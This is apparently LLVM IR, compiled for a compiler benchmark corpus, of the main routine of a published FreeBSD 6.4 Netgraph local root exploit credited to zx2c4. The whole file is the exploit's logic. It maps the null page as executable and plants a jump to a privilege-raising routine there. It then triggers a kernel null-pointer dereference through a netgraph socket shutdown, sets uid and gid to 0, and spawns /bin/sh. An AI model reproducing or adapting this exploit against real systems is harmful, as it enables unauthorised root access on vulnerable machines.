; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/bsd/local/extr_16951.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/bsd/local/extr_16951.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [45 x i8] c"~ FreeBSD <= 6.4-RELEASE Netgraph Exploit ~\0A\00", align 1
@.str.1 = private unnamed_addr constant [45 x i8] c"~~~~~~~~~~~~~~~~~ by zx2c4 ~~~~~~~~~~~~~~~~\0A\00", align 1
@.str.2 = private unnamed_addr constant [46 x i8] c"~~~~~ greetz to don bailey, edemveiss ~~~~~\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c"[+] mmapping null page\0A\00", align 1
@PAGES = common dso_local global i32 0, align 4
@PAGE_SIZE = common dso_local global i32 0, align 4
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@PROT_EXEC = common dso_local global i32 0, align 4
@MAP_ANON = common dso_local global i32 0, align 4
@MAP_FIXED = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [16 x i8] c"[-] mmap failed\00", align 1
@.str.5 = private unnamed_addr constant [39 x i8] c"[+] adding jmp to pwnage in null page\0A\00", align 1
@root = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [29 x i8] c"[+] opening netgraph socket\0A\00", align 1
@PF_NETGRAPH = common dso_local global i32 0, align 4
@SOCK_DGRAM = common dso_local global i32 0, align 4
@NG_DATA = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [35 x i8] c"[-] failed to open netgraph socket\00", align 1
@.str.8 = private unnamed_addr constant [33 x i8] c"[+] triggering null dereference\0A\00", align 1
@SHUT_RDWR = common dso_local global i32 0, align 4
@got_root = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [30 x i8] c"[-] failed to trigger pwnage\0A\00", align 1
@.str.10 = private unnamed_addr constant [27 x i8] c"[+] elevating permissions\0A\00", align 1
@.str.11 = private unnamed_addr constant [24 x i8] c"[-] failed to get root\0A\00", align 1
@.str.12 = private unnamed_addr constant [15 x i8] c"[+] got root!\0A\00", align 1
@.str.13 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.14 = private unnamed_addr constant [3 x i8] c"sh\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %7 = call i32 @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str, i64 0, i64 0))
  %8 = call i32 @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.1, i64 0, i64 0))
  %9 = call i32 @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.2, i64 0, i64 0))
  %10 = call i32 @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0))
  %11 = load i32, i32* @PAGES, align 4
  %12 = load i32, i32* @PAGE_SIZE, align 4
  %13 = mul nsw i32 %11, %12
  %14 = load i32, i32* @PROT_READ, align 4
  %15 = load i32, i32* @PROT_WRITE, align 4
  %16 = or i32 %14, %15
  %17 = load i32, i32* @PROT_EXEC, align 4
  %18 = or i32 %16, %17
  %19 = load i32, i32* @MAP_ANON, align 4
  %20 = load i32, i32* @MAP_FIXED, align 4
  %21 = or i32 %19, %20
  %22 = call i64 @mmap(i32* null, i32 %13, i32 %18, i32 %21, i32 -1, i32 0)
  %23 = icmp slt i64 %22, 0
  br i1 %23, label %24, label %26

24:                                               ; preds = %2
  %25 = call i32 @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.4, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %57

26:                                               ; preds = %2
  %27 = call i32 @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.5, i64 0, i64 0))
  store i8 -112, i8* null, align 1
  store i8 -23, i8* inttoptr (i64 1 to i8*), align 1
  store i64 ptrtoint (i32* @root to i64), i64* inttoptr (i64 2 to i64*), align 8
  %28 = call i32 @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.6, i64 0, i64 0))
  %29 = load i32, i32* @PF_NETGRAPH, align 4
  %30 = load i32, i32* @SOCK_DGRAM, align 4
  %31 = load i32, i32* @NG_DATA, align 4
  %32 = call i32 @socket(i32 %29, i32 %30, i32 %31)
  store i32 %32, i32* %6, align 4
  %33 = load i32, i32* %6, align 4
  %34 = icmp slt i32 %33, 0
  br i1 %34, label %35, label %37

35:                                               ; preds = %26
  %36 = call i32 @perror(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.7, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %57

37:                                               ; preds = %26
  %38 = call i32 @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.8, i64 0, i64 0))
  %39 = load i32, i32* %6, align 4
  %40 = load i32, i32* @SHUT_RDWR, align 4
  %41 = call i32 @shutdown(i32 %39, i32 %40)
  %42 = load i32, i32* @got_root, align 4
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %46, label %44

44:                                               ; preds = %37
  %45 = call i32 @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.9, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %57

46:                                               ; preds = %37
  %47 = call i32 @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.10, i64 0, i64 0))
  %48 = call i32 @setuid(i32 0)
  %49 = call i32 @setgid(i32 0)
  %50 = call i64 (...) @getuid()
  %51 = icmp ne i64 %50, 0
  br i1 %51, label %52, label %54

52:                                               ; preds = %46
  %53 = call i32 @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.11, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %57

54:                                               ; preds = %46
  %55 = call i32 @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.12, i64 0, i64 0))
  %56 = call i32 @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i64 0, i64 0), i32* null)
  store i32 0, i32* %3, align 4
  br label %57

57:                                               ; preds = %54, %52, %44, %35, %24
  %58 = load i32, i32* %3, align 4
  ret i32 %58
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i64 @mmap(i32*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @shutdown(i32, i32) #1

declare dso_local i32 @setuid(i32) #1

declare dso_local i32 @setgid(i32) #1

declare dso_local i64 @getuid(...) #1

declare dso_local i32 @execl(i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
